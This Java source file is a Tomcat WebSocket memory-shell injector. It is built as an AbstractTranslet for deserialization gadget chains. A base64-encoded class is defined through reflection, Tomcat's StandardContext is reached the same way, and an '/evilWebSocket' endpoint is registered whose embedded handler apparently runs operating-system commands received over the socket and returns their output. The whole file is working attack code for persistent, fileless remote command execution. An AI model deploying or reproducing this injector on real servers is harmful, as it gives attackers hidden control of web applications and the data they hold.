package org.example.tomcatmemshell.WebSocket;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.net.NioEndpoint;
import org.apache.tomcat.websocket.server.WsServerContainer;

import javax.websocket.DeploymentException;
import javax.websocket.server.ServerEndpointConfig;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.concurrent.*;

public class WebSocketMemShell extends AbstractTranslet {
    public WebSocketMemShell() {
        try{
            byte[] classBytes = Base64.getDecoder().decode("yv66vgAAADQAygoAKQBfCgBgAGEIAGIHAGMKAGQAZQoAZgBnCgBoAGkJAGoAawoABABsCgBtAG4JACgAbwsAcABxCAByCgBqAHMKAAQAdAgAdQoABAB2CAB3CAB4CAB5CAB6CgB7AHwKAHsAfQoAfgB/BwCACgAZAF8KAIEAggoAGQCDCgCBAIQKAH4AhQsAcACGCgAZAIcLAIgAiQcAigoAIgCLBwCMBwCNCgAlAI4KACgAjwcAkAcAkQcAkwEAB3Nlc3Npb24BABlMamF2YXgvd2Vic29ja2V0L1Nlc3Npb247AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADpMb3JnL2V4YW1wbGUvdG9tY2F0bWVtc2hlbGwvV2ViU29ja2V0L0V2aWxTZXJ2ZXJXZWJTb2NrZXQ7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnN0cmluZwEAAltCAQAKRXhjZXB0aW9ucwEABm9uT3BlbgEAPChMamF2YXgvd2Vic29ja2V0L1Nlc3Npb247TGphdmF4L3dlYnNvY2tldC9FbmRwb2ludENvbmZpZzspVgEABmNvbmZpZwEAIExqYXZheC93ZWJzb2NrZXQvRW5kcG9pbnRDb25maWc7AQAJb25NZXNzYWdlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAARjbWRzAQALaW5wdXRTdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAA1zdHJpbmdCdWlsZGVyAQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAAWkBAAFJAQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEAIExqYXZhL2xhbmcvSW50ZXJydXB0ZWRFeGNlcHRpb247AQAHbWVzc2FnZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHADcHAJAHAGMHAJQHAJUHAIAHAIoHAIwBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBAAlTaWduYXR1cmUBAAVXaG9sZQEADElubmVyQ2xhc3NlcwEAVExqYXZheC93ZWJzb2NrZXQvRW5kcG9pbnQ7TGphdmF4L3dlYnNvY2tldC9NZXNzYWdlSGFuZGxlciRXaG9sZTxMamF2YS9sYW5nL1N0cmluZzs+OwEAClNvdXJjZUZpbGUBABhFdmlsU2VydmVyV2ViU29ja2V0LmphdmEMAC0ALgcAlgwAlwCZAQBNdGFyZ2V0L2NsYXNzZXMvb3JnL2V4YW1wbGUvdG9tY2F0bWVtc2hlbGwvV2ViU29ja2V0L0V2aWxTZXJ2ZXJXZWJTb2NrZXQuY2xhc3MBABBqYXZhL2xhbmcvU3RyaW5nBwCaDACbAJwHAJ0MAJ4AnwcAoAwAoQCiBwCjDACkAKUMAC0ApgcApwwAqABADAArACwHAKkMAKoAqwEAB29zLm5hbWUMAKwArQwArgCvAQADd2luDACwALEBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwCyDACzALQMALUAtgcAlAwAtwC4AQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIHAJUMALkAugwAuwC8DAC9AC4MAL4AugwAvwDBDADCAK8HAMQMAMUAQAEAE2phdmEvaW8vSU9FeGNlcHRpb24MAMYALgEAHmphdmEvbGFuZy9JbnRlcnJ1cHRlZEV4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAtAMcMAD8AQAEAOG9yZy9leGFtcGxlL3RvbWNhdG1lbXNoZWxsL1dlYlNvY2tldC9FdmlsU2VydmVyV2ViU29ja2V0AQAYamF2YXgvd2Vic29ja2V0L0VuZHBvaW50BwDIAQAkamF2YXgvd2Vic29ja2V0L01lc3NhZ2VIYW5kbGVyJFdob2xlAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAE2phdmEvbmlvL2ZpbGUvUGF0aHMBAANnZXQBADsoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uaW8vZmlsZS9QYXRoOwEAE2phdmEvbmlvL2ZpbGUvRmlsZXMBAAxyZWFkQWxsQnl0ZXMBABgoTGphdmEvbmlvL2ZpbGUvUGF0aDspW0IBABhqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXIBAAZlbmNvZGUBAAYoW0IpW0IBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQAFKFtCKVYBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAF2phdmF4L3dlYnNvY2tldC9TZXNzaW9uAQARYWRkTWVzc2FnZUhhbmRsZXIBACMoTGphdmF4L3dlYnNvY2tldC9NZXNzYWdlSGFuZGxlcjspVgEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAARyZWFkAQADKClJAQAGYXBwZW5kAQAcKEMpTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEABWNsb3NlAQAHd2FpdEZvcgEADmdldEJhc2ljUmVtb3RlAQAFQmFzaWMBACgoKUxqYXZheC93ZWJzb2NrZXQvUmVtb3RlRW5kcG9pbnQkQmFzaWM7AQAIdG9TdHJpbmcHAMkBACRqYXZheC93ZWJzb2NrZXQvUmVtb3RlRW5kcG9pbnQkQmFzaWMBAAhzZW5kVGV4dAEAD3ByaW50U3RhY2tUcmFjZQEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgEAHmphdmF4L3dlYnNvY2tldC9NZXNzYWdlSGFuZGxlcgEAHmphdmF4L3dlYnNvY2tldC9SZW1vdGVFbmRwb2ludAAhACgAKQABACoAAQACACsALAAAAAUAAQAtAC4AAQAvAAAALwABAAEAAAAFKrcAAbEAAAACADAAAAAGAAEAAAANADEAAAAMAAEAAAAFADIAMwAAAAkANAA1AAIALwAAAF4ABAACAAAAIrgAAhIDA70ABLgABbgABrYAB0yyAAi7AARZK7cACbYACrEAAAACADAAAAAOAAMAAAAPABMAEAAhABEAMQAAABYAAgAAACIANgA3AAAAEwAPADgAOQABADoAAAAEAAEAIgABADsAPAABAC8AAABWAAIAAwAAABAqK7UACyq0AAsquQAMAgCxAAAAAgAwAAAADgADAAAAFQAFABYADwAXADEAAAAgAAMAAAAQADIAMwAAAAAAEAArACwAAQAAABAAPQA+AAIAAQA/AEAAAQAvAAABnwAEAAcAAACaEg24AA62AA8SELYAEZoAGAa9AARZAxISU1kEEhNTWQUrU6cAFQa9AARZAxIUU1kEEhVTWQUrU064ABYttgAXTSy2ABg6BLsAGVm3ABo6BRkEtgAbWTYGAp8ADxkFFQaStgAcV6f/6xkEtgAdLLYAHlcqtAALuQAfAQAZBbYAILkAIQIApwAVTSy2ACOnAA1NuwAlWSy3ACa/sQACAAAAhACHACIAAACEAI8AJAADADAAAABCABAAAAAcADgAHQBAAB4ARgAfAE8AIQBbACIAZwAjAGwAJABxACUAhAAqAIcAJgCIACcAjAAqAI8AKACQACkAmQArADEAAABcAAkAQABEAEEAQgACADgATABDADcAAwBGAD4ARABFAAQATwA1AEYARwAFAFcALQBIAEkABgCIAAQASgBLAAIAkAAJAEoATAACAAAAmgAyADMAAAAAAJoATQBOAAEATwAAADkAByVRBwBQ/wAXAAYHAFEHAFIHAFMHAFAHAFQHAFUAAPwAFwH/AB8AAgcAUQcAUgABBwBWRwcAVwkQQQA/AFgAAQAvAAAAMwACAAIAAAAJKivAAAS2ACexAAAAAgAwAAAABgABAAAADQAxAAAADAABAAAACQAyADMAAAADAFkAAAACAFwAXQAAAAIAXgBbAAAAGgADACoAkgBaBgkAaABgAJgACQCIAMMAwAYJ");
//                        ClassLoader classLoader = ClassLoader.getSystemClassLoader();//不能使用，找不到Tomcat下的类,如java.lang.NoClassDefFoundError: org/apache/tomcat/util/threads/ThreadPoolExecutor
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Method defineClass = ClassLoader.class.getDeclaredMethod(
                    "defineClass", String.class, byte[].class, int.class, int.class
            );
            defineClass.setAccessible(true);
            Class<?> EvilServerWebSocketClass = (Class<?>) defineClass.invoke(classLoader,
                    "org.example.tomcatmemshell.WebSocket.EvilServerWebSocket" , classBytes, 0, classBytes.length
            );
            Object instance = EvilServerWebSocketClass.getDeclaredConstructor().newInstance();
            ServerEndpointConfig serverEndpointConfig = ServerEndpointConfig.Builder.create(EvilServerWebSocketClass,"/evilWebSocket").build();
            StandardContext standardContext = getStandardContext1();
            WsServerContainer wsServerContainer = (WsServerContainer) standardContext.getServletContext().getAttribute("javax.websocket.server.ServerContainer");
            wsServerContainer.addEndpoint(serverEndpointConfig);

        } catch (IllegalAccessException ex) {
            throw new RuntimeException(ex);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(e);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        } catch (InstantiationException e) {
            throw new RuntimeException(e);
        } catch (DeploymentException e) {
            throw new RuntimeException(e);
        }
    }
    public static StandardContext getStandardContext1() {
        try{
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context StandardContext =  resources.getContext();
            return (StandardContext) StandardContext;
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }
    public static Object getClassField(Class clazz,Object object, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        Object var =  field.get(object);
        return var;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
